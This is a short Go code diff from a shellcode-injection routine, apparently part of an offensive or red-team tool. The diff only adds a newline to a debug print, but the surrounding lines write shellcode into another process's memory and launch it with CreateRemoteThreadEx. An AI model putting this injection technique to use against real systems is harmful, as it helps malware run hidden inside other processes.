@@ -40,7 +40,7 @@ func injectShellcode(shellcode []byte, pid uint32) {
 		log.Fatal("Fail to write to allocated memory: ", err)
 	}
 	fmt.Println("WriteProcessMemory is ok. Bytes written: ", bytesWritten)
-	fmt.Printf("rPtr: %#x", rPtr)
+	fmt.Printf("rPtr: %#x\n", rPtr)
 
 	// Create our remote thread to execute!
 	tHandle, err := winsyscall.CreateRemoteThreadEx(pHandle, nil, 0, rPtr, 0, 0, nil)
